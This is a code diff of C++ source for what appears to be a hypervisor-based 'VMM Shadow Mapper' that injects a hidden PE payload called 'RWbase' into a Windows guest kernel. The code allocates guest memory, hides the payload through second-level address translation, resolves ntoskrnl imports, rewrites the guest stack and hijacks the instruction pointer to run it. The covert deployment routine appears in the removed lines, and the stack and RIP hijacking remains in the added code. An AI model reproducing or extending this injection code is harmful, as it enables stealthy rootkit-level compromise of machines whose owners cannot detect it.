@@ -1,4 +1,4 @@
-// =============================================================================
+﻿﻿// =============================================================================
 // VMM Shadow Mapper - Payload Deployer (Business Management Module)
 // Coordinates loading of RWbase payloads
 // =============================================================================
@@ -84,50 +84,6 @@ bool validate_payload(const unsigned char* data, const size_t size)
 bool is_payload_ready()
 {
     return validate_payload(payload::rwbase_image, payload::rwbase_image_size);
-}
-
-// =============================================================================
-// Payload Info Logging
-// =============================================================================
-
-/**
- * @description 打印 Payload 的关键信息与摘要。
- * @param {context_t*} ctx 加载器上下文。
- * @param {const char*} name Payload 名称。
- * @param {const unsigned char*} data Payload 数据指针。
- * @param {const size_t} size Payload 数据大小。
- */
-void print_payload_info(context_t* ctx, const char* name, const unsigned char* data, const size_t size)
-{
-    logs::print(ctx->log_ctx, "[Loader] === %s Payload Info ===\n", name);
-    logs::print(ctx->log_ctx, "[Loader]   Size: %d bytes\n", size);
-
-    if (!validate_payload(data, size)) {
-        logs::print(ctx->log_ctx, "[Loader]   ERROR: Invalid PE format\n");
-        return;
-    }
-
-    const auto dos = reinterpret_cast<const image_dos_header_t*>(data);
-    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(data + dos->e_lfanew);
-
-    logs::print(ctx->log_ctx, "[Loader]   ImageBase:     0x%p\n", nt->optional_header.image_base);
-    logs::print(ctx->log_ctx, "[Loader]   EntryPoint:    0x%x\n", nt->optional_header.address_of_entry_point);
-    logs::print(ctx->log_ctx, "[Loader]   SizeOfImage:   0x%x\n", nt->optional_header.size_of_image);
-    logs::print(ctx->log_ctx, "[Loader]   Sections:      %d\n", nt->file_header.number_of_sections);
-
-    // Hex dump first 64 bytes for integrity verification
-    logs::print(ctx->log_ctx, "[Loader]   First 64 bytes:\n");
-    logs::print(ctx->log_ctx, "[Loader]   ");
-    for (size_t i = 0; i < 64 && i < size; i++) {
-        if (i > 0 && i % 16 == 0) {
-            logs::print(ctx->log_ctx, "\n[Loader]   ");
-        }
-        const uint8_t b = data[i];
-        const char hex_chars[] = "0123456789ABCDEF";
-        char hex[3] = { hex_chars[b >> 4], hex_chars[b & 0xF], ' ' };
-        logs::print(ctx->log_ctx, "%s", hex);
-    }
-    logs::print(ctx->log_ctx, "\n");
 }
 
 // =============================================================================
@@ -295,129 +251,19 @@ static bool map_payload_pages_to_guest(context_t* ctx, const allocation_info_t& 
 }
 
 // =============================================================================
-// RWbase Deployment
-// =============================================================================
-
-/**
- * @description 部署 RWbase Payload 并进行 SLAT 隐藏。
- * @param {context_t*} ctx 加载器上下文。
- * @param {const uint64_t} ntoskrnl_base 来宾 ntoskrnl 基址。
- * @return {deploy_result_t} 部署结果。
- */
-deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_base, const uint64_t target_guest_entry)
-{
-    if (!ctx) return deploy_result_t::memory_allocation_failed;
-
-    const uint32_t current_state = ctx->deployment_state.load(std::memory_order_acquire);
-    if (current_state == 2) {
-        return deploy_result_t::success;
-    }
-
-    uint32_t expected_state = 0;
-    if (!ctx->deployment_state.compare_exchange_strong(expected_state, 1, std::memory_order_acq_rel)) {
-        if (expected_state == 2) {
-            return deploy_result_t::success;
-        }
-        return deploy_result_t::already_in_progress;
-    }
-
-    logs::print(ctx->log_ctx, "[Loader] ========================================\n");
-    logs::print(ctx->log_ctx, "[Loader] RWbase Payload Deployment Starting\n");
-    logs::print(ctx->log_ctx, "[Loader] ========================================\n");
-
-    if (!ctx->module_cache.initialized) {
-        set_discovery_slat_cr3(ctx, slat::hyperv_cr3(nullptr));
-        set_discovery_cr3(ctx, arch::get_guest_cr3());
-        if (!init_guest_discovery(ctx, ntoskrnl_base)) {
-            logs::print(ctx->log_ctx, "[Loader] WARNING: Guest discovery init failed\n");
-        }
-    }
-    else
-    {
-        set_discovery_cr3(ctx, arch::get_guest_cr3());
-    }
-
-    if (!validate_payload(payload::rwbase_image, payload::rwbase_image_size)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Invalid RWbase payload\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::invalid_payload;
-    }
-
-    print_payload_info(ctx, "RWbase", payload::rwbase_image, payload::rwbase_image_size);
-
-    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
-    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(
-        payload::rwbase_image + dos->e_lfanew
-    );
-    const uint32_t image_size = nt->optional_header.size_of_image;
-
-    allocation_info_t alloc = {};
-    if (!allocate_guest_memory(ctx, image_size, &alloc)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to allocate Guest memory for RWbase\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::memory_allocation_failed;
-    }
-
-    logs::print(ctx->log_ctx, "[Loader] RWbase allocation: Guest PA=0x%p, Guest VA=0x%p, VMM=0x%p\n",
-        alloc.guest_physical_base, alloc.guest_virtual_base, alloc.vmm_mapped_address);
-
-    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);
-
-    logs::print(ctx->log_ctx, "[Loader] Mapping PE sections...\n");
-    if (!map_sections(alloc.vmm_mapped_address, payload::rwbase_image, payload::rwbase_image_size)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to map sections\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::invalid_payload;
-    }
-
-    const uint64_t target_va = target_guest_entry & ~0xFFFULL;
-
-    logs::print(ctx->log_ctx, "[Loader] Fixing security cookie...\n");
-    if (!fix_security_cookie(ctx, alloc.vmm_mapped_address, target_va)) {
-        logs::print(ctx->log_ctx, "[Loader] WARNING: Security cookie fix failed\n");
-    }
-
-    logs::print(ctx->log_ctx, "[Loader] Applying relocations (base: 0x%p)...\n", target_va);
-    if (!apply_relocations(ctx, alloc.vmm_mapped_address, target_va)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Relocation failed\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::relocation_failed;
-    }
-
-    logs::print(ctx->log_ctx, "[Loader] Resolving imports (ntoskrnl=0x%p)...\n", ntoskrnl_base);
-    if (!resolve_payload_imports(ctx, alloc.vmm_mapped_address, ntoskrnl_base)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Import resolution failed\n");
-        logs::print(ctx->log_ctx, "[Loader] Note: RWbase requires NETIO.SYS/fwpkclnt.sys imports\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::import_resolution_failed;
-    }
-
-    const uint32_t entry_rva = get_entry_point_rva(alloc.vmm_mapped_address);
-    const uint64_t entry_va = target_va + entry_rva;
-
-    if (!map_payload_pages_to_guest(ctx, alloc, target_va)) {
-        logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to map payload into Guest via SLAT\n");
-        ctx->deployment_state.store(0, std::memory_order_release);
-        return deploy_result_t::memory_allocation_failed;
-    }
-
-    logs::print(ctx->log_ctx, "[Loader] RWbase ready at EP: 0x%p (Guest VA)\n", entry_va);
-
-    auto& inject_ctx = g_runtime_context.injection_ctx;
-    inject_ctx.payload_guest_base.store(target_va);
-    inject_ctx.payload_entry.store(entry_va);
-
-    ctx->deployment_state.store(2, std::memory_order_release);
-    return deploy_result_t::success;
-}
-
-// =============================================================================
 // Dynamic Injection Helpers (Stage Machine Support)
 // =============================================================================
 
 bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
 {
     trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
+
+    // Fix: Read RSP from VMCS as tf->rsp might be unreliable (especially for #DB exits)
+    // The original Hyper-V handler might not populate RSP in the trap frame for all exit types.
+    tf->rsp = arch::get_guest_rsp();
+
+    const uint64_t guest_rsp = tf->rsp;
+
     auto& inject_ctx = g_runtime_context.injection_ctx;
 
     // 1. Resolve Allocation API if not already resolved
@@ -450,16 +296,6 @@ bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
     // 4. Setup Stack (Shadow Space + Return Address)
     // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
     // NOTE: This assumes we can access Guest RAM.
-    uint64_t guest_rsp = tf->rsp;
-    if (guest_rsp == 0)
-    {
-        guest_rsp = arch::get_guest_rsp();
-    }
-    if (guest_rsp == 0)
-    {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Guest RSP is zero. CR3=%p\n", arch::get_guest_cr3().flags);
-        return false;
-    }
 
     // Stack Alignment Logic:
     // Windows x64 ABI requires RSP to be 16-byte aligned AFTER the CALL instruction pushes the return address.
@@ -487,44 +323,35 @@ bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
     
     // So: Align guest RSP down to 16, then subtract 0x28.
     // 0x20 (Shadow) + 0x8 (RetAddr) = 0x28.
-    if ((guest_rsp & 0xFFF) < 0x28)
-    {
-        return false;
-    }
+    const uint64_t new_rsp = aligned_base_rsp - 0x28;
 
-    uint64_t new_rsp = aligned_base_rsp - 0x28;
+    // Translate new_rsp to Host PA/VA
+    virtual_address_t gva_rsp = {};
+    gva_rsp.address = new_rsp;
 
-    uint8_t shadow_space[0x30] = {};
-    const uint64_t shadow_written = memory_manager::operate_on_guest_virtual_memory(
-        slat::hyperv_cr3(&g_runtime_context.slat_ctx),
-        shadow_space,
-        new_rsp,
+    const uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
         arch::get_guest_cr3(),
-        sizeof(shadow_space),
-        memory_operation_t::write_operation
+        slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
+        gva_rsp
     );
 
-    if (shadow_written != sizeof(shadow_space)) {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to prepare Guest Stack. RSP=%p NewRSP=%p CR3=%p\n",
+    if (guest_pa == 0) {
+        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP. RSP=%p NewRSP=%p CR3=%p\n", 
             guest_rsp, new_rsp, arch::get_guest_cr3().flags);
         return false;
     }
 
-    uint64_t magic_return = injection_ctx_t::MAGIC_TRAP_RIP;
-    const uint64_t bytes_written = memory_manager::operate_on_guest_virtual_memory(
+    void* host_stack_ptr = memory_manager::map_guest_physical(
         slat::hyperv_cr3(&g_runtime_context.slat_ctx),
-        &magic_return,
-        new_rsp,
-        arch::get_guest_cr3(),
-        sizeof(magic_return),
-        memory_operation_t::write_operation
+        guest_pa
     );
-
-    if (bytes_written != sizeof(magic_return)) {
-        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to write Guest RSP. RSP=%p NewRSP=%p CR3=%p\n",
-            guest_rsp, new_rsp, arch::get_guest_cr3().flags);
-        return false;
+    if (!host_stack_ptr) {
+         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
+         return false;
     }
+
+    // Write Magic Trap Return Address
+    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;
 
     // 5. Update Trap Frame
     tf->rsp = new_rsp;
@@ -553,6 +380,7 @@ bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
     // But we know the size we requested: saved_guest_context doesn't have it, but we computed it from payload.
     
     inject_ctx.allocated_buffer = allocated_base;
+    inject_ctx.payload_guest_base.store(allocated_base, std::memory_order_release);
     
     const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
     const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
@@ -590,6 +418,11 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
     const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
     const uint32_t image_size = nt->optional_header.size_of_image;
 
+    const uint64_t target_va = inject_ctx.payload_guest_base.load(std::memory_order_acquire);
+
+    logs::print(ctx->log_ctx, "[Injection] STAGE 3 SKIPPED: Allocated Address=0x%p, Size=0x%X\n", target_va, image_size);
+
+    /*
     allocation_info_t alloc = {};
     if (!allocate_guest_memory(ctx, image_size, &alloc)) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate Guest memory for RWbase\n");
@@ -602,7 +435,6 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
         return false;
     }
 
-    const uint64_t target_va = inject_ctx.payload_guest_base.load(std::memory_order_acquire);
     if (target_va == 0) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Payload Guest VA not initialized\n");
         return false;
@@ -646,6 +478,7 @@ bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
     arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100); // Clear TF (Bit 8)
 
     logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Hijacking RIP to 0x%p\n", entry_va);
+    */
     return true;
 }
 
